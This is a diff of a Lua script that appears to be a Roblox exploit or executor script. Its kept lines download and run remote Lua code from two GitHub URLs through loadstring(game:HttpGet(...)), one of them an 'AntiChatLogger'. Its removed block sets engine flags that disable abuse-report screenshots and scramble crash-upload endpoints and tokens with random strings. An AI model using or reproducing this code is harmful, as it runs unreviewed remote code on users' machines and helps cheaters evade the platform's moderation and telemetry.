@@ -22,31 +22,6 @@ writefile("data.txt", content)
 -- Initiating Protections here:
 loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLogger.lua", true))()
 
-
-if setfflag then
-    task.wait(0.5)
-    local function genstring(length)
-        local Chars = {}
-        for i = 1, length do
-            local Random = math.random(1, 62) 
-            table.insert(Chars, string.char(Random < 27 and Random + 96 or (Random < 53 and Random + 38 or Random - 27)))
-        end
-        return table.concat(Chars, "")
-    end
-
-    local success, error = pcall(function()
-        setfflag("AbuseReportScreenshotPercentage", "0")
-        setfflag("DFFlagAbuseReportScreenshot", "False")
-        setfflag("DFStringCrashPadUploadToBacktraceToBacktraceBaseUrl", genstring(math.random(1, 25)))
-        setfflag("DFIntCrashUploadToBacktracePercentage", genstring(math.random(1, 35)))
-        setfflag("DFStringCrashUploadToBacktraceBlackholeToken", genstring(math.random(1, 28)))
-        setfflag("DFStringCrashUploadToBacktraceWindowsPlayerToken", genstring(math.random(1, 250)))
-    end)
-    if error then
-        warn("Failed to set fflags.")
-    end
-end
-
 -- Initiating handler
 loadstring(game:HttpGet("https://raw.githubusercontent.com/synnyyy/synergy/additional/temp.lua", true))()
           
